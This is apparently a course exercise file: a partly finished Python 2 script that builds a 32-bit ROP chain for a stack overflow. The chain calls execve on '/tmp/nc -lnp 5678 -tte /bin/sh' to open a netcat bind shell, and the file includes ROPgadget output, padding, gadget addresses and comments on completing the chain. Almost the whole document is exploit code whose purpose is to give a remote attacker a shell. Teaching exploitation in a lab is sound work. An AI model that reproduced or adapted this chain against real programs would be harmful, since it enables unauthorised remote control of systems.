"""
This is incomplete code and you are supposed to complete it.
We want to execute "/tmp/nc -lnp 5678 -tte /bin/sh" via execve syscall.

----------------------------------------
execve calling convention:

1. EAX = 11
2. EBX = "/tmp//nc" (char *)
3. ECX = arguments (char **) -> char *arguments[7]= { "/tmp//nc", "-lnp", "5678", "-tte", "/bin//sh", NULL}
4. EDX = env (char **) -> NULL
-----------------------------------------

The gadgets in the following code are based on my machine & binary and as a result you will have to adjust the gadget based on your environment.
With the latest ROPGadget tool that we used in the class, we get the following ropchain:
- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x8056d05 mov dword ptr [edx], eax ; ret -> MOVISTACK
	[+] Gadget found: 0x806ee8b pop edx ; ret -> POPEDX
	[+] Gadget found: 0x80a8bf6 pop eax ; ret -> POPEAX
	[+] Gadget found: 0x80562c0 xor eax, eax ; ret -> XOREAX

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x80562c0 xor eax, eax ; ret
	[+] Gadget found: 0x807c32a inc eax ; ret -> INCEAX

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret -> POPEBX
	[+] Gadget found: 0x806eeb2 pop ecx ; pop ebx ; ret -> POPECX remember there is an extra POP, so you need to provide something meaningful for ebx too!
	[+] Gadget found: 0x806ee8b pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049603 int 0x80

- Step 5 -- Build the ROP chain
 
"""


from struct import pack
import os
######################################
fileName=raw_input("Enter the file name")
outfile=open(fileName, "wb")
# Padding goes here
p = '\x41'*44

p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data edx=0x080da060
p += pack('<I', 0x080a8bf6) # pop eax ; ret
p += '/tmp' 				# eax=/bin
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret ->[080da060]=/bin
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4 edx=0x080da064
p += pack('<I', 0x080a8bf6) # pop eax ; ret
p += '//nc'					# eax=//sh
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8 edx=0x080da068
p += pack('<I', 0x080562c0) # xor eax, eax ; ret
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret ->null byte insertion
# repeat the avobe process to copy rest of the commandline by adjusting the addresses
#### bear in mind that the computed addresses muct not have any \x00!!!!!!!
# once done, start seting up arguments[] see example python code exploit-nc.py at line 130
# We currently have our list of elements separated by \0
# Now we must construct our char ** i.e. array 'argguments' of strings
# arguments=[ @"/bin//nc", @"-lnp", @"6666", @"-tte", @"/bin//sh"]

# choose an address after @.data + len(commandline +1). Lets call it X. later on, this will be the content of ecx.

#once done, we start setting up the environment for execve.
# first set ebx to point to which command we want to execute (@ /tmp//nc)
p += pack('<I', 0x080481c9) # pop ebx ; ret #remember to change the address
p += pack('<I', 0x080da060) # @ .data -> ebx is set to program to execute [point 2]

# now set ecx to have address of arguments[]
p += pack('<I', 0x0806eeb2) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # change this to X --> @ .data + + len(commandline +1) -> ecx=0x080da068
p += pack('<I', 0x080da060) # padding without overwrite ebx 
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8 edx=NULL [point 4]
p += pack('<I', 0x080562c0) # xor eax, eax ; ret eax=0
p += pack('<I', 0x0807c32a) # inc eax ; ret eax=1
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret eax=11 [point1]
p += pack('<I', 0x08049603) # int 0x80

outfile.write(p)
outfile.close()
